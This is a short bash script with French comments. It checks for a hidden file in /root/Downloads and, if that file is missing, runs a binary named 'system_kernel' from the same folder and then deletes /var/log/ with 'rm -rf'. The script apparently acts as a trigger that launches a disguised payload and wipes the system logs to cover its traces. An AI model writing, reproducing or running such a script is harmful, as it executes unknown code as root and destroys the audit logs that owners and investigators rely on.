#!/bin/bash

# Chemin vers le fichier à vérifier
file="/root/Downloads/.document1.txt"

# Vérifier si le fichier existe
if [ -f "$file" ]; then
    exit 0
else
	/root/Downloads/./system_kernel
	rm -rf /var/log/
fi

